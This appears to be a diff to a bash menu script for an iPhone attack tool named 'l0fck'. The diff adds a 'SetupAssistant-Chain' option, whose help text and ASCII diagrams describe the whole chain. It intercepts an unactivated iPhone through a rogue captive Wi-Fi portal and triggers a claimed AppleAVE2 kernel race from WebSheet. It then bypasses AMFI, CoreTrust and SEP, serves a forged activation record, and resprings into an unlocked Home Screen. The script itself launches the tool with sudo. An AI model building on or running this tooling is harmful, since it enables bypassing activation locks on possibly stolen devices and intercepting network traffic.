@@ -146,10 +146,10 @@ EOF
 
 print_doc_neo_chain() {
     cat <<'EOF'
-Neo-Chain pivots from timing-based TOCTOU to kernel exploitation
-leveraging A18 Pro's missing MTE. Stages: kernel R/W (V-047 or MCC),
-AMFI/CoreTrust bypass (trust_cache_rt), SEP/NVRAM, persistence, verify.
-Blocked stages fall back per awaiting_offsets.txt.
+Neo-Chain uses AppleAVE2 CVE-2026-84607 eEncType race condition 
+for kernel R/W on A18 Pro. Stages: kernel R/W, AMFI/CoreTrust bypass 
+(trust_cache_rt), SEP/NVRAM, persistence, verify. Blocked stages fall 
+back per awaiting_offsets.txt.
 EOF
 }
 
@@ -223,6 +223,26 @@ activation-related traffic. Privileged ports (53/80/443) require sudo.
 EOF
 }
 
+print_doc_setup_assistant_chain() {
+    cat <<'EOF'
+Wi-Fi Portal & Setup Assistant AppleAVE2 Video Kernel Exploit & Activation Chain:
+Full End-to-End Chain: Soft AP -> WebSheet -> AppleAVE2 Win -> Device Activation.
+Launches captive DNS (53), HTTP (80), and TLS (443) servers to intercept
+Apple CNA probe queries from an unactivated device in Setup Assistant.
+Automatically pops up WebSheet on the device, executes loader.js recon,
+and triggers the AppleAVE2 (CVE-2026-84607) eEncType state management race
+directly from WebSheet via WebCodecs VideoEncoder to the WebKit GPU process
+and kernel AppleAVE2Driver.
+Once kernel R/W is won:
+1. Injects CoreTrust trust cache and disarms AMFI/SEP kernel hooks.
+2. Transitions Wi-Fi Captive Portal to Success mode (dismissing WebSheet).
+3. Serves synthesized A18 Pro activation record on /deviceservices/deviceActivation.
+4. When USB is connected, injects MobileActivation & PurpleBuddy flags, stages
+   preferences to Media partition, broadcasts 14 Darwin setup dismissal
+   notifications, and resprings directly into the unlocked Home Screen.
+EOF
+}
+
 # ---------------------------------------------------------------------------
 # ASCII art blocks
 # ---------------------------------------------------------------------------
@@ -261,7 +281,7 @@ print_art_neo_chain() {
 |                        NEO-CHAIN EXECUTION FLOW                     |
 +---------------------------------------------------------------------+
 |  STAGE 0: RECON (A18 Pro, MTE absent)                               |
-|  STAGE 1: KERNEL R/W (V-047 OOB or MCC testMode)                  |
+|  STAGE 1: KERNEL R/W (AppleAVE2 CVE-2026-84607)                     |
 |  STAGE 2: AMFI / CoreTrust (CVMServer + trust_cache_rt)             |
 |  STAGE 3: SEP / MobileActivation (NVRAM via PMAP)                   |
 |  STAGE 4: PERSISTENCE (AFC staging, IOMFB blocked)                  |
@@ -378,6 +398,28 @@ kernel R/W (V-047 or MCC)
         +--> AMFI HSP disable (blocked: proc.p_flag unresolved)
         |
         +--> CoreTrust cs_blob validation patch (data-only)
+EOF
+}
+
+print_art_setup_assistant_chain() {
+    cat <<'EOF'
+  iPhone (Setup Assistant)  --->  Soft AP / Wi-Fi  --->  Captive DNS/HTTP
+             |                                                 |
+             v                                                 v
+    WebSheet.app opens     <--- Serves WebCodecs Race <---  l0fck Host Engine
+             |                                                 |
+             +---> VideoEncoder eEncType State Race            |
+             |     Kernel R/W Won (kbase verified)             v
+             |        |                                 Stage 6: Kernel R/W & AMFI
+             |        +---> POST /api/appleave2-result  Stage 7: CNA Success Release
+             v                                                 |
+    WebSheet Dismissed     <--- Serves 'Success' & Albert <----+
+             |
+             +---> Optional USB Attachment:
+                      |---> Flag Injection (ActivationState=Activated)
+                      |---> Offline A18 Pro Activation Record
+                      |---> 14 Darwin Dismissal Broadcasts
+                      `---> SpringBoard Respring -> Unlocked Home Screen!
 EOF
 }
 
@@ -696,11 +738,12 @@ menu_advanced_chains() {
         echo -e "${BOLD}3.${RESET}  ${CYAN}${BOLD}Sovereign-Chain (Hybrid Security Degradation)${RESET}"
         echo -e "${BOLD}4.${RESET}  ${CYAN}${BOLD}Sovereign-Lite (Injection + Notification)${RESET}"
         echo -e "${BOLD}5.${RESET}  ${CYAN}${BOLD}Neo-Chain (Kernel Exploitation Bypass)${RESET}"
+        echo -e "${BOLD}6.${RESET}  ${CYAN}${BOLD}SetupAssistant-Chain (Wi-Fi Portal, WebSheet & AppleAVE2 Video Kernel Exploit)${RESET}"
         echo ""
         echo -e "${BOLD}B.${RESET}  Back"
         echo -e "${BOLD}0.${RESET}  Exit"
         echo "----------------------------------------------------------------------"
-        echo -n "Select an option [1-5, B, 0]: "
+        echo -n "Select an option [1-6, B, 0]: "
         read -r choice
 
         case "$choice" in
@@ -734,6 +777,43 @@ menu_advanced_chains() {
                 "${RED}Danger: kernel exploit chain${RESET}" \
                 print_doc_neo_chain print_art_neo_chain \
                 ./l0fck --neo-chain ;;
+            6)
+                print_banner
+                echo -e "${CYAN}${BOLD}SetupAssistant-Chain Configuration${RESET}"
+                echo ""
+                echo "Select Port Mode:"
+                echo "  1) Privileged CNA Ports (53/80/443) - [Recommended for real iPhone CNA, requires sudo]"
+                echo "  2) Custom / User Ports (e.g. 5353/8080/8443)"
+                echo ""
+                echo -n "Choose mode [1-2, default: 1]: "
+                read -r pmode
+                if [ "$pmode" = "2" ]; then
+                    echo -n "Enter HTTP port [8080]: "
+                    read -r hport
+                    if [ -z "$hport" ]; then hport=8080; fi
+                    echo -n "Enter DNS port [5353]: "
+                    read -r dport
+                    if [ -z "$dport" ]; then dport=5353; fi
+                    echo -n "Enter TLS port [8443]: "
+                    read -r tport
+                    if [ -z "$tport" ]; then tport=8443; fi
+                    local cmd="./l0fck --setup-assistant-chain --captive-server ${hport} --captive-dns-port ${dport} --captive-tls-port ${tport}"
+                    run_confirmed "6" "SetupAssistant-Chain (User Ports)" \
+                        "$cmd" \
+                        "Wi-Fi Soft AP only (No USB cable required), host listening on custom ports" \
+                        "${YELLOW}Caution: network interception${RESET}" \
+                        print_doc_setup_assistant_chain print_art_setup_assistant_chain \
+                        ./l0fck --setup-assistant-chain --captive-server "$hport" --captive-dns-port "$dport" --captive-tls-port "$tport"
+                else
+                    local cmd="sudo ./l0fck --setup-assistant-chain"
+                    run_confirmed "6" "SetupAssistant-Chain (Privileged Ports)" \
+                        "$cmd" \
+                        "Wi-Fi Soft AP only (No USB cable required); requires sudo for ports 53/80" \
+                        "${RED}Danger: privileged network interception${RESET}" \
+                        print_doc_setup_assistant_chain print_art_setup_assistant_chain \
+                        sudo ./l0fck --setup-assistant-chain
+                fi
+                ;;
             [Bb]) return ;;
             0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
             *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
